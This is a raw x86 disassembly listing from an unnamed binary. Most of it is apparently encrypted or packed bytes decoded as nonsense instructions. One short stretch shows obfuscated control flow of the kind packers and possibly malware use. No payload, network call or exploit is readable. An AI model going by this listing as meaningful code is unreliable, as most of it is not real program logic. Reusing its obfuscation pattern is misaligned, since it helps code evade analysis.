  4059b7:	lea    esp,[ecx-0x4e]
  4059ba:	imul   DWORD PTR [ecx-0x47]
  4059bd:	adc    BYTE PTR [ebp+edi*8-0x4c],ah
  4059c1:	push   ebx
  4059c2:	mov    dh,0x9e
  4059c4:	fbld   TBYTE PTR [esi+0x58]
  4059c7:	mov    al,ds:0xe0160e3c
  4059cc:	in     al,0x5c
  4059ce:	data16 fwait
  4059d0:	or     bl,0x55
  4059d3:	and    al,0x7a
  4059d5:	pop    esi
  4059d6:	jl     0x4059e5
  4059d8:	stc    
  4059d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059da:	bound  esi,QWORD PTR [ebx-0x49df6ffc]
  4059e0:	adc    eax,0x8b515ef5
  4059e5:	jns    0x4059ce
  4059e7:	outs   dx,BYTE PTR ds:[esi]
  4059e8:	dec    ecx
  4059e9:	push   es
  4059ea:	dec    eax
  4059eb:	jmp    FWORD PTR [ecx+0x4bc8cc1a]
  4059f1:	std    
  4059f2:	mov    ebp,0xe99433a3
  4059f7:	rcr    DWORD PTR [ecx+0x133d9a8],0x86
  4059fe:	and    al,0xa2
  405a00:	dec    ebp
  405a01:	mov    BYTE PTR [edx],cl
  405a03:	test   BYTE PTR [edi],ch
  405a05:	mov    cl,0xc1
  405a07:	inc    esp
  405a08:	xchg   edx,eax
  405a09:	pop    ebx
  405a0a:	sbb    dh,ah
  405a0c:	xor    BYTE PTR gs:[edi],ah
  405a0f:	dec    eax
  405a10:	and    al,0xef
  405a12:	mov    dh,0x41
  405a14:	dec    eax
  405a15:	shr    DWORD PTR [ecx],0x6c
  405a18:	mov    esp,DWORD PTR [edx-0x32]
  405a1b:	(bad)  
  405a1c:	loope  0x405a22
  405a1e:	icebp  
  405a1f:	fsubr  QWORD PTR [edi+0x37]
  405a22:	bound  eax,QWORD PTR ds:0xd1377687
  405a28:	push   ss
  405a29:	gs push ecx
  405a2b:	dec    ecx
  405a2c:	and    DWORD PTR [ecx],esp
  405a2e:	(bad)  
  405a30:	lock jle 0x4059e3
  405a33:	and    DWORD PTR [ebp+0x7c],esp
  405a36:	jmp    0xe1b8f9b6
  405a3b:	adc    al,0x7d
  405a3d:	test   BYTE PTR ds:0x10fcd9c7,dl
  405a43:	or     al,0x53
  405a45:	sbb    BYTE PTR [eax],bl
  405a47:	push   ss
  405a48:	xor    DWORD PTR [edi+edx*8],eax
  405a4b:	sbb    al,0x54
  405a4d:	xchg   edi,eax
  405a4e:	mov    bh,BYTE PTR [ebp+0x7]
  405a51:	call   0xad31:0x89930569
  405a58:	inc    edx
  405a59:	or     eax,0xd3746f23
  405a5e:	aas    
  405a5f:	xor    eax,0x3595f6c1
  405a64:	hlt    
  405a65:	adc    BYTE PTR [edx+eax*1+0xe],0x68
  405a6a:	popa   
  405a6b:	sbb    BYTE PTR [edi+0x3f0979f8],dl
  405a71:	pop    esp
  405a72:	push   esp
  405a73:	leave  
  405a74:	fld    DWORD PTR [ecx+0xc4a6285]
  405a7a:	fbld   TBYTE PTR [ebp-0x6018bc10]
  405a80:	loop   0x405aac
  405a82:	dec    esi
  405a83:	mov    ecx,0x50318164
  405a88:	dec    ecx
  405a89:	mov    ebx,0xfcde1e08
  405a8e:	test   eax,0x239d2171
  405a93:	inc    esp
  405a94:	sub    ah,BYTE PTR gs:[esi+0x3092b12]
  405a9b:	enter  0xd209,0x8a
  405a9f:	fcom   DWORD PTR [ecx]
  405aa1:	fmul   DWORD PTR [edx+0x7]
  405aa4:	repz loopne 0x405aa5
  405aa7:	or     al,dl
  405aa9:	dec    edi
  405aaa:	rcr    BYTE PTR [edi-0x3e1c0fb9],0xc3
  405ab1:	sti    
  405ab2:	add    bh,cl
  405ab4:	in     eax,0xe7
  405ab6:	add    BYTE PTR [edx+ebx*4-0x38],cl
  405aba:	and    al,0xa
  405abc:	xchg   DWORD PTR [ecx],ebp
  405abe:	mov    ebp,0xe8c00f25
  405ac3:	jae    0x405a77
  405ac5:	lock inc eax
  405ac7:	gs cdq 
  405ac9:	rcl    ah,1
  405acb:	out    dx,al
  405acc:	mov    ebx,DWORD PTR [ebx+0x5f3bc163]
  405ad2:	pop    edi
  405ad3:	loope  0x405a86
  405ad5:	push   es
  405ad6:	dec    esi
  405ad7:	(bad)  
  405ad8:	adc    DWORD PTR [esi+0x2e473bd6],ebp
  405ade:	call   0xc281:0x8f91ef07
  405ae5:	jae    0x405b53
  405ae7:	and    eax,0x7545d28d
  405aec:	std    
  405aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aee:	add    DWORD PTR [ebp+0xb],ebx
  405af1:	pop    esp
  405af2:	inc    DWORD PTR [edx-0x545d13fd]
  405af8:	das    
  405af9:	jge    0x405ac5
  405afb:	jmp    0x4d2e4f4e
  405b00:	in     al,dx
  405b01:	(bad)  
  405b02:	pushf  
  405b03:	xor    ebx,ecx
  405b05:	pop    ebx
  405b06:	pop    esp
  405b07:	div    BYTE PTR ds:0x5027a6a5
  405b0d:	pop    esp
  405b0e:	mov    esi,0x7b909273
  405b13:	(bad)  
  405b14:	push   ebp
  405b15:	dec    edi
  405b16:	jle    0x405b45
  405b18:	jg     0x405b83
  405b1a:	xchg   ebp,eax
  405b1b:	(bad)  
  405b1d:	cld    
  405b1e:	daa    
  405b1f:	popa   
  405b20:	sbb    DWORD PTR [esi+edi*1],edi
  405b23:	ja     0x405ad7
  405b25:	pushf  
  405b26:	rol    BYTE PTR [ebp+0x75],1
  405b29:	hlt    
  405b2a:	push   edi
  405b2b:	fucomi st,st(4)
  405b2d:	lahf   
  405b2e:	test   eax,0x899a697d
  405b33:	dec    ebp
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43379b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433753,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4337a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4337ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43382f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x40f5f25f
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405b84
  405be0:	cmp    ah,dl
  405be2:	cmc    
  405be3:	int3   
  405be4:	fldz   
  405be6:	(bad)  
  405be7:	fdiv   DWORD PTR [eax]
  405be9:	xor    DWORD PTR [edx*8-0x21943b8a],edi
  405bf0:	fwait
  405bf1:	rol    BYTE PTR [ebp+0x42ac7aaf],cl
  405bf7:	pop    edx
  405bf8:	out    dx,eax
  405bf9:	xor    BYTE PTR [esi-0x2c],ah
  405bfc:	jmp    0x405bf8
  405bfe:	ins    DWORD PTR es:[edi],dx
  405bff:	in     al,dx
  405c00:	add    BYTE PTR [ecx+0x689a70f9],bh
  405c06:	push   ds
  405c07:	jne    0x405c76
  405c09:	fdivr  st(2),st
  405c0b:	das    
  405c0c:	and    edx,DWORD PTR [ebx]
  405c0e:	out    dx,eax
  405c0f:	in     al,dx
  405c10:	push   ss
  405c11:	push   es
  405c12:	shr    ecx,cl
  405c14:	and    eax,0x8d56270
  405c19:	popa   
  405c1a:	inc    ebp
  405c1b:	daa    
  405c1c:	push   esp
  405c1d:	mov    cl,0x4f
  405c1f:	ins    BYTE PTR es:[edi],dx
  405c20:	adc    cl,BYTE PTR [edi]
  405c22:	fist   DWORD PTR ds:0x154028d
  405c28:	ficom  WORD PTR [esi]
  405c2a:	fs sti 
  405c2c:	mov    al,ds:0x7eb9b55c
  405c31:	sbb    ebx,DWORD PTR [edx+0x2053a83b]
  405c37:	aas    
  405c38:	enter  0xa68d,0x28
  405c3c:	pop    ds
  405c3d:	pop    ebx
  405c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c3f:	ja     0x405bef
  405c41:	aas    
  405c42:	arpl   WORD PTR [ecx-0x72],bx
  405c45:	imul   eax,DWORD PTR [edi],0x75
  405c48:	and    esi,DWORD PTR [eax]
  405c4a:	sbb    eax,0xe457c423
  405c4f:	pop    ebp
  405c50:	dec    eax
  405c51:	mov    ah,0x3d
  405c53:	mov    ah,BYTE PTR [esi-0x82cbbfe]
  405c59:	pop    ss
  405c5a:	dec    ecx
  405c5b:	sti    
  405c5c:	sti    
  405c5d:	or     eax,DWORD PTR [ecx]
  405c5f:	dec    ebx
  405c60:	cli    
  405c61:	retf   0xd348
  405c64:	sub    al,0xb7
  405c66:	in     al,dx
  405c67:	fimul  WORD PTR [edx+0x5df012c2]
  405c6d:	imul   ebp,DWORD PTR [eax],0x36
  405c70:	and    eax,esi
  405c72:	dec    eax
  405c74:	retf   0x36e9
  405c77:	aaa    
  405c78:	int    0x60
  405c7a:	mov    bh,0xd1
  405c7c:	mov    eax,ds:0x74f2d89f
  405c81:	mov    edi,0x1d1dd984
  405c86:	out    0xf1,al
  405c88:	xchg   ecx,eax
  405c89:	arpl   cx,ax
  405c8b:	aaa    
  405c8c:	dec    eax
  405c8d:	in     al,0xf4
  405c8f:	jmp    0x405cde
  405c91:	lods   al,BYTE PTR ds:[esi]
  405c92:	sti    
  405c93:	and    bh,BYTE PTR [esi+0x561e0ce6]
  405c99:	mov    edi,0xa399363a
  405c9e:	jns    0x405caa
  405ca0:	push   0xffffffbd
  405ca2:	jmp    FWORD PTR [esi]
  405ca4:	js     0x405c96
  405ca6:	mov    bl,0x4
  405ca8:	push   ecx
  405ca9:	jge    0x405ce6
  405cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cac:	sahf   
  405cad:	and    DWORD PTR [edx+0x34],edx
  405cb0:	push   cs
  405cb1:	push   eax
  405cb2:	test   al,0xbc
  405cb4:	daa    
  405cb5:	repnz (bad) 
  405cb7:	adc    ah,BYTE PTR ds:0xa586926d
  405cbd:	sub    BYTE PTR [esi-0x63],al
  405cc0:	(bad)  
  405cc1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  405cc3:	cwde   
  405cc4:	in     eax,dx
  405cc5:	(bad)  
  405cc7:	(bad)  
  405cc8:	aad    0xb5
  405cca:	jb     0x405c7e
  405ccc:	push   edi
  405ccd:	dec    ebx
  405cce:	sbb    esi,DWORD PTR [edx]
  405cd0:	cmp    BYTE PTR [ecx],dh
  405cd2:	in     al,dx
  405cd3:	add    al,0x7
  405cd5:	js     0x405d13
  405cd7:	out    0xe7,al
  405cd9:	cmp    BYTE PTR [esi],ah
  405cdb:	cmp    cl,bh
  405cdd:	adc    eax,0x8f0c36b8
  405ce2:	aam    0xcc
  405ce4:	sti    
  405ce5:	popa   
  405ce6:	dec    edi
  405ce7:	ret    0xdb7b
  405cea:	call   0xc6526efb
  405cef:	out    dx,eax
  405cf0:	push   cs
  405cf1:	add    bh,BYTE PTR [ebx-0x5603375d]
  405cf7:	lods   eax,DWORD PTR ds:[esi]
  405cf8:	or     BYTE PTR [esi],bh
  405cfa:	(bad)  
  405cfb:	jae    0x405d68
  405cfd:	popa   
  405cfe:	syscall 
  405d00:	jo     0x405cf5
  405d02:	aaa    
  405d03:	lea    ecx,[eax-0x37]
  405d06:	pop    ebp
  405d07:	idiv   BYTE PTR [edx]
  405d09:	(bad)  
  405d0b:	scas   al,BYTE PTR es:[edi]
  405d0c:	test   BYTE PTR [eax],dh
  405d0e:	sub    DWORD PTR [edx-0x78e85c67],ebp
  405d14:	or     al,0xd7
  405d16:	xchg   edx,eax
  405d17:	aaa    
  405d18:	mov    DWORD PTR ds:0x912cf0c7,ecx
  405d1e:	push   ss
  405d1f:	add    BYTE PTR [ebp+0x5395d853],cl
  405d25:	mov    ds:0xf8e40057,al
  405d2a:	add    bh,bh
  405d2c:	inc    esi
  405d2d:	sar    DWORD PTR [ebp-0x737d5040],0xc0
  405d34:	bound  ebp,QWORD PTR [eax]
  405d36:	out    0xa9,eax
  405d38:	cli    
  405d39:	sbb    al,0x56
  405d3b:	push   0x34b226f
  405d40:	lds    esp,FWORD PTR [ecx-0x6f5ecfb5]
  405d46:	loopne 0x405dc3
  405d48:	dec    ebx
  405d49:	(bad)  
  405d4a:	cli    
  405d4b:	push   ss
  405d4c:	cmp    BYTE PTR [di+0x2d],dh
  405d50:	mov    dh,0xa7
  405d52:	mov    al,0x32
  405d54:	add    eax,0x1ec43d94
  405d59:	in     al,0xb8
  405d5b:	arpl   ax,sp
  405d5d:	cwde   
  405d5e:	sbb    eax,ecx
  405d60:	push   es
  405d61:	inc    ebp
  405d62:	fcmove st,st(4)
  405d64:	mov    bh,0x25
  405d66:	add    DWORD PTR [edx+0xe],edi
  405d69:	(bad)  
  405d6a:	cld    
  405d6b:	jp     0x405d36
  405d6d:	loope  0x405d4d
  405d6f:	lock push edx
  405d71:	es push ebx
  405d73:	lahf   
  405d74:	adc    BYTE PTR [edi-0x63],cl
  405d77:	(bad)  
  405d78:	fwait
  405d79:	in     eax,0x1e
  405d7b:	in     eax,dx
  405d7c:	or     cl,al
  405d7e:	xchg   ecx,eax
  405d7f:	int    0xd1
  405d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d82:	lods   al,BYTE PTR ds:[esi]
  405d83:	or     esp,DWORD PTR ds:0x2c71a0b6
  405d89:	inc    eax
  405d8a:	arpl   WORD PTR [esi],dx
  405d8c:	popa   
  405d8d:	or     ch,dh
  405d8f:	imul   edx,ebx,0xffffff9d
  405d92:	xor    dl,dl
  405d94:	push   ebx
  405d95:	cld    
  405d96:	xor    DWORD PTR [ebp-0x55134893],ebx
  405d9c:	or     eax,DWORD PTR [esi-0x15b780bf]
  405da2:	aaa    
  405da3:	pushf  
  405da4:	push   ecx
  405da5:	mov    ecx,0x29faaa18
  405daa:	repnz stc 
  405dac:	adc    BYTE PTR [ebx-0x32],dl
  405daf:	rcl    esp,0x21
  405db2:	sub    DWORD PTR [esi+0x5ff51ae8],esi
  405db8:	out    0x37,al
  405dba:	inc    edx
  405dbb:	dec    ebp
  405dbc:	xor    bl,BYTE PTR [edx+0x7d5a1911]
  405dc2:	mov    es,WORD PTR [eax-0x50]
  405dc5:	mov    ds:0x7aa16ce7,al
  405dca:	sahf   
  405dcb:	jle    0x405de9
  405dcd:	mov    edi,0xe040c13
  405dd2:	jg     0x405d55
  405dd4:	dec    edi
  405dd5:	cli    
  405dd6:	jno    0x405dd6
  405dd8:	mov    bl,0x99
  405dda:	inc    ebp
  405ddb:	jl     0x405d5f
  405ddd:	loopne 0x405e43
  405ddf:	call   0xf07a:0xfe3e139f
  405de6:	call   0x7dca:0xcc13365a
  405ded:	push   ss
  405dee:	jne    0x405d70
  405df0:	and    ah,BYTE PTR [edi]
  405df2:	cmp    dl,bl
  405df4:	hlt    
  405df5:	outs   dx,DWORD PTR ds:[esi]
  405df6:	add    DWORD PTR [ecx+0x6449f1d3],eax
  405dfc:	pusha  
  405dfd:	icebp  
  405dfe:	jmp    DWORD PTR [ebx]
  405e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e01:	in     al,dx
  405e02:	sar    DWORD PTR [ecx+0x53],cl
  405e05:	and    eax,0xe004cfb
  405e0a:	inc    ebp
  405e0b:	leave  
  405e0c:	test   DWORD PTR [esi+eax*1+0x7e9026c6],ebp
  405e13:	mov    ebp,0xd493f87d
  405e18:	inc    esp
  405e19:	adc    ebx,DWORD PTR [edi]
  405e1b:	aad    0x3a
  405e1d:	das    
  405e1e:	pop    ss
  405e1f:	pinsrw mm2,WORD PTR [esi+ebp*2],0xd0
  405e24:	iret   
  405e25:	pop    es
  405e26:	repnz add eax,DWORD PTR [edx-0x4d647cb4]
  405e2d:	or     eax,0xad7049b
  405e32:	fisubr DWORD PTR [esi-0x61]
  405e35:	mov    DWORD PTR [edi],esp
  405e37:	mov    ebx,0xa9d86c82
  405e3c:	add    ah,BYTE PTR [esi-0x5b8b342a]
  405e42:	les    edx,FWORD PTR [ebx]
  405e44:	xchg   edx,eax
  405e45:	cmc    
  405e46:	sahf   
  405e47:	into   
  405e48:	pop    es
  405e49:	sub    al,0x30
  405e4b:	(bad)  
  405e4d:	jle    0x405ecb
  405e4f:	stos   BYTE PTR es:[edi],al
  405e50:	cmp    al,0x29
  405e52:	fisubr DWORD PTR [eax+0x4978d51f]
  405e58:	push   eax
  405e59:	pusha  
  405e5a:	jnp    0x405e39
  405e5c:	retf   0x4651
  405e5f:	aad    0x5d
  405e61:	ror    BYTE PTR [esi-0x7cd57323],1
  405e67:	or     DWORD PTR [ecx+0x35ae61ff],esi
  405e6d:	pop    es
  405e6e:	(bad)  
  405e6f:	jmp    0x405df1
  405e71:	push   0x1878437
  405e76:	sub    DWORD PTR [ebp+0x58],ebp
  405e79:	sub    edx,DWORD PTR [edx]
  405e7b:	out    dx,eax
  405e7c:	cmp    eax,0x4fb58fdf
  405e81:	cdq    
  405e82:	and    al,0xf6
  405e84:	outs   dx,BYTE PTR ds:[esi]
  405e85:	loope  0x405ea6
  405e87:	push   0xdb3f8e82
  405e8c:	push   ebx
  405e8d:	mov    cl,0xf0
  405e8f:	or     al,0x14
  405e91:	outs   dx,DWORD PTR ds:[esi]
  405e92:	imul   ebx,DWORD PTR [ebp-0x27],0xffffff9a
  405e96:	jne    0x405ee3
  405e98:	pop    ebx
  405e99:	sub    DWORD PTR [ecx+0x7c],edi
  405e9c:	mov    ecx,0x152b0f86
  405ea1:	mov    esi,0xecdfd70c
  405ea6:	in     al,dx
  405ea7:	ja     0x405e71
  405ea9:	ins    BYTE PTR es:[edi],dx
  405eaa:	dec    esi
  405eab:	add    al,0xcf
  405ead:	cwde   
  405eae:	pop    edx
  405eaf:	in     eax,dx
  405eb0:	ins    DWORD PTR es:[edi],dx
  405eb1:	(bad)  
  405eb2:	(bad)  
  405eb3:	in     eax,0x53
  405eb5:	mov    ch,0xf6
  405eb7:	xchg   edi,eax
  405eb8:	mul    BYTE PTR [edx-0x33]
  405ebb:	fisub  DWORD PTR ds:[edi]
  405ebe:	sub    ebx,DWORD PTR [ecx+esi*1]
  405ec1:	mov    ebp,0x8fcf1f2f
  405ec6:	mov    eax,0x72f497e
  405ecb:	pop    DWORD PTR [eax+0x2]
  405ece:	cs lock mov ch,0x84
  405ed2:	push   0xe6ca37d3
  405ed7:	(bad)  
  405ed8:	pop    ebx
  405ed9:	cli    
  405eda:	leave  
  405edb:	and    DWORD PTR [ebp-0x5a],edx
  405ede:	push   eax
  405edf:	lahf   
  405ee0:	div    BYTE PTR [ebp+0x5e]
  405ee3:	sar    dh,0xe6
  405ee6:	or     esp,DWORD PTR [esi+0x6d]
  405ee9:	ja     0x405f52
  405eeb:	adc    BYTE PTR [eax+0x14],0x29
  405eef:	sbb    al,0x69
  405ef1:	gs lahf 
  405ef3:	push   ss
  405ef4:	int3   
  405ef5:	push   es
  405ef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ef7:	popf   
  405ef8:	or     cl,BYTE PTR [edi+0xc30b026]
  405efe:	pusha  
  405eff:	shr    BYTE PTR [edx+0x40587a29],0xe7
  405f06:	loopne 0x405f6e
  405f08:	dec    eax
  405f09:	outs   dx,BYTE PTR ds:[esi]
  405f0a:	or     BYTE PTR ds:0x50c2c35a,0xe
  405f11:	xor    esi,ecx
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ebp-0x595840eb],es
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	adc    dl,BYTE PTR [edx+edx*1-0x2b]
  405f36:	mov    es,ebx
  405f38:	xchg   esp,eax
  405f39:	or     al,0xd0
  405f3b:	mov    eax,0xf5902838
  405f40:	fstp   DWORD PTR [edi]
  405f42:	and    al,0x86
  405f44:	add    eax,0xeb4281fe
  405f49:	xchg   BYTE PTR ds:0xe86ee0b2,al
  405f4f:	push   0xc654edc1
  405f54:	mov    dh,0x18
  405f56:	jp     0x405f34
  405f58:	jns    0x405f93
  405f5a:	popa   
  405f5b:	push   0x56
  405f5d:	xlat   BYTE PTR ds:[ebx]
  405f5e:	fcmovb st,st(0)
  405f60:	sub    al,0x4b
  405f62:	imul   esi,DWORD PTR [edx],0x3c
  405f65:	and    BYTE PTR [eax-0x5180ddd4],al
  405f6b:	dec    ebp
  405f6c:	mov    bh,0x17
  405f6e:	rcr    dl,1
  405f70:	sbb    DWORD PTR [edx-0x30c8f3b],esi
  405f76:	or     ecx,DWORD PTR [edx]
  405f78:	push   cs
  405f79:	pop    esp
  405f7a:	mov    esi,0xcc541871
  405f7f:	cld    
  405f80:	(bad)  
  405f81:	shr    BYTE PTR [esi],0x50
  405f84:	push   ebp
  405f85:	ret    
  405f86:	dec    esi
  405f87:	or     dh,cl
  405f89:	jg     0x405f5e
  405f8b:	cli    
  405f8c:	ins    BYTE PTR es:[edi],dx
  405f8d:	dec    eax
  405f8e:	int    0x30
  405f90:	jne    0x405ffd
  405f92:	push   ebx
  405f93:	mov    edx,0x48c64b54
  405f98:	(bad)  [edi]
  405f9a:	mov    edi,0xe17c1b38
  405f9f:	ss ins DWORD PTR es:[edi],dx
  405fa1:	sub    DWORD PTR [eax-0x1604ab8b],eax
  405fa7:	add    DWORD PTR [eax],ebx
  405fa9:	lahf   
  405faa:	adc    al,0x17
  405fac:	syscall 
  405fae:	es cmc 
  405fb0:	into   
  405fb1:	stos   BYTE PTR es:[edi],al
  405fb2:	pop    ebp
  405fb3:	test   eax,0x18b7bf59
  405fb8:	mov    esi,0x8e78eeb8
  405fbd:	jle    0x405fca
  405fbf:	out    0xf7,eax
  405fc1:	and    DWORD PTR [ecx-0xb],edx
  405fc4:	mov    BYTE PTR [edx+0x34],ah
  405fc7:	(bad)  
  405fc8:	ds and al,0x7e
  405fcb:	imul   esp,DWORD PTR [edi+0x9f2f41e],0xf49b562a
  405fd5:	fmul   st(3),st
  405fd7:	retf   
  405fd8:	stos   BYTE PTR es:[edi],al
  405fd9:	fld    QWORD PTR es:[edi]
  405fdc:	cmp    DWORD PTR [edi+edx*4-0x4f1a9fdd],edi
  405fe3:	imul   edi,DWORD PTR [edx],0xfd8ae3cb
  405fe9:	inc    ebp
  405fea:	lds    eax,FWORD PTR [ecx+0x7b]
  405fed:	lea    ecx,[ebx-0x3cddfd14]
  405ff3:	xor    ah,BYTE PTR [esi-0x493416f2]
  405ff9:	fwait
  405ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ffb:	out    0x46,al
  405ffd:	fcomp  DWORD PTR [eax]
  405fff:	in     eax,0x7d
  406001:	outs   dx,DWORD PTR ds:[esi]
  406002:	sbb    BYTE PTR [ebx-0x50],cl
  406005:	popa   
  406006:	push   esi
  406007:	lods   eax,DWORD PTR ds:[esi]
  406008:	adc    eax,0x94e0cdd0
  40600d:	cmp    eax,0x44d2393a
  406012:	arpl   WORD PTR [eax+ecx*1+0xf],sp
  406016:	adc    BYTE PTR [eax+0x22],dl
  406019:	inc    esp
  40601a:	ss mov dh,0x8c
  40601d:	scas   al,BYTE PTR es:[edi]
  40601e:	aad    0xbe
  406020:	xor    ah,BYTE PTR [edx-0x23]
  406023:	popf   
  406024:	xchg   BYTE PTR [edi],dl
  406026:	hlt    
  406027:	push   ss
  406028:	and    BYTE PTR [ecx-0x7f12bc3f],dl
  40602e:	jg     0x40607a
  406030:	mov    al,0xa7
  406032:	mov    ds:0x240c17b9,eax
  406037:	fsubr  QWORD PTR [edi]
  406039:	lods   al,BYTE PTR ds:[esi]
  40603a:	add    DWORD PTR ds:0x8ab5e6af,esi
  406040:	clc    
  406041:	inc    eax
  406042:	jmp    0x2971f7da
  406047:	clc    
  406048:	mov    ch,0x53
  40604a:	mov    edx,0xdde4312
  40604f:	adc    edx,ebx
  406051:	arpl   bx,sp
  406053:	ds ja  0x40601e
  406056:	popa   
  406057:	pop    esi
  406058:	lods   al,BYTE PTR ds:[esi]
  406059:	(bad)  
  40605a:	pusha  
  40605b:	lea    ebx,ss:[esi+esi*2+0x7d3f3e18]
  406063:	mov    ebp,0x3f15ebfc
  406068:	imul   edi,DWORD PTR [edi+0x9828443],0xffffffd6
  40606f:	sub    dh,cl
  406071:	xor    DWORD PTR [esi+edx*2],0xbed7dfc7
  406078:	mov    edi,0x1c032743
  40607d:	scas   eax,DWORD PTR es:[edi]
  40607e:	cmp    dh,BYTE PTR [edx-0x69]
  406081:	outs   dx,BYTE PTR es:[esi]
  406083:	popa   
  406084:	mov    eax,0xcd488c7c
  406089:	push   esp
  40608a:	fist   DWORD PTR ds:0x8091b192
  406090:	inc    ebp
  406091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406092:	fimul  DWORD PTR [edi]
  406094:	les    esp,FWORD PTR ds:0xfc980f2e
  40609a:	repnz sbb DWORD PTR [ebx-0xc],0xffffffae
  40609f:	stos   BYTE PTR es:[edi],al
  4060a0:	sbb    DWORD PTR [edx+0x2e],esp
  4060a3:	xchg   edx,eax
  4060a4:	neg    BYTE PTR [ebx]
  4060a6:	adc    dl,0xdf
  4060a9:	imul   edi,DWORD PTR [ebx-0x52],0x10
  4060ad:	outs   dx,DWORD PTR ds:[esi]
  4060ae:	dec    ebp
  4060af:	adc    edi,DWORD PTR [edi+ecx*4]
  4060b2:	or     eax,0x47631250
  4060b7:	fldenv [eax]
  4060b9:	push   ebx
  4060ba:	jmp    0xc8b1:0x844c6879
  4060c1:	push   edx
  4060c2:	lods   eax,DWORD PTR ds:[esi]
  4060c3:	shl    edi,0x58
  4060c6:	lahf   
  4060c7:	rcr    DWORD PTR [eax+0x2305768a],1
  4060cd:	push   ebx
  4060ce:	fimul  WORD PTR [esi-0x45]
  4060d1:	loop   0x406072
  4060d3:	popf   
  4060d4:	outs   dx,DWORD PTR ds:[esi]
  4060d5:	test   BYTE PTR [eax],dh
  4060d7:	(bad)  
  4060d8:	push   esp
  4060d9:	loop   0x4060ba
  4060db:	xchg   ebp,eax
  4060dc:	pop    edx
  4060dd:	loopne 0x406106
  4060df:	out    dx,al
  4060e0:	cli    
  4060e1:	jno    0x40615d
  4060e3:	mov    dh,0x8d
  4060e5:	mov    dh,0x58
  4060e7:	lock inc ebx
  4060e9:	mov    ds:0x6cef3798,al
  4060ee:	enter  0x2bb,0x7d
  4060f2:	mul    DWORD PTR [edx]
  4060f4:	jns    0x40609a
  4060f6:	in     eax,0x84
  4060f8:	push   esi
  4060f9:	cmp    eax,0x63e1672d
  4060fe:	xor    dh,BYTE PTR [ebx+ecx*4]
  406101:	imul   esi,DWORD PTR [edi+0x30],0xffffffc3
  406105:	xor    BYTE PTR [ebp-0x40],cl
  406108:	ds sahf 
  40610a:	mov    ecx,0x36c1df9a
  40610f:	mov    al,0x3d
  406111:	das    
  406112:	rol    ebp,1
  406114:	push   0xba725110
  406119:	sbb    BYTE PTR [ebx-0x19e706dc],ah
  40611f:	adc    eax,0xc883040
  406124:	xor    al,0x85
  406126:	dec    ebp
  406127:	adc    eax,0xe86927ae
  40612c:	cmp    ah,BYTE PTR [edi+0x3d]
  40612f:	or     bh,bl
  406131:	or     al,0xe7
  406133:	xor    eax,0x3154436c
  406138:	add    eax,0xd90806f0
  40613d:	call   ecx
  40613f:	xor    DWORD PTR [edi+0x0],0x30
  406143:	repz adc al,al
  406146:	xor    esp,esi
  406148:	(bad)  
  406149:	jle    0x406159
  40614b:	dec    ebx
  40614c:	mov    DWORD PTR [ebx],esp
  40614e:	not    BYTE PTR [eax+0x5]
  406151:	add    ah,BYTE PTR [ecx]
  406153:	xor    DWORD PTR [ecx],edi
  406155:	arpl   WORD PTR [edi],cx
  406157:	and    BYTE PTR [edx+0x36ace64d],al
  40615d:	sub    eax,0xa7f76e03
  406162:	ins    DWORD PTR es:[edi],dx
  406163:	fisub  DWORD PTR [ecx+0x7acdb855]
  406169:	sbb    eax,0x35f91255
  40616e:	test   ecx,0xb1d69c1
  406174:	inc    ebx
  406175:	int    0x44
  406177:	or     BYTE PTR [edi+0x35],0x50
  40617b:	xchg   edi,eax
  40617c:	sub    eax,0xfb885895
  406181:	enter  0xcc77,0x7a
  406185:	mov    ebx,0xed4911b0
  40618a:	leave  
  40618b:	pop    edi
  40618c:	iret   
  40618d:	cmc    
  40618e:	das    
  40618f:	and    edi,DWORD PTR [ebx+esi*2-0x2]
  406193:	bts    DWORD PTR [ecx],0x52
  406197:	xchg   esp,eax
  406198:	mov    ch,0x53
  40619a:	shr    BYTE PTR [si-0x5d],1
  40619e:	jl     0x406204
  4061a0:	das    
